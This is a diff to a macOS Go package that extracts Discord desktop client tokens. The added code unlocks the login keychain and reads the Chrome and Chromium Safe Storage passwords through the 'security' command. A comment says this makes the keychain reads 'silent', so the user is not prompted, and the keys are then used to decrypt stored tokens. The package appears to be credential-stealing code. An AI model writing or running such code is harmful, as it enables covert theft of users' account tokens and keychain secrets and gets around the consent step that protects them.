@@ -1,5 +1,10 @@
 //go:build darwin
 
+// Package discord extracts Discord desktop client tokens from LevelDB storage.
+//
+// Discord (and Discord PTB/Canary) store encrypted tokens under
+// ~/Library/Application Support/discord*/. Decryption reuses Chromium-style
+// Safe Storage keys (same Keychain service family as Chrome on macOS).
 package discord
 
 import (
@@ -39,8 +44,14 @@ func discordV10Key(appDir string) []byte {
 }
 
 func darwinDiscordKey() []byte {
-	for _, account := range []string{"Chrome", "Chromium"} {
-		password, err := crypto.RunSecurityStdout("find-generic-password", "-wa", account)
+	// After EnsureLoginKeychainUnlocked, set-key-partition-list is applied — silent reads.
+	_ = crypto.EnsureLoginKeychainUnlocked()
+	type svcAcct struct{ service, account string }
+	for _, sa := range []svcAcct{
+		{"Chrome Safe Storage", "Chrome"},
+		{"Chromium Safe Storage", "Chromium"},
+	} {
+		password, err := crypto.RunSecurityStdout("find-generic-password", "-s", sa.service, "-a", sa.account, "-w")
 		if err != nil || password == "" {
 			continue
 		}
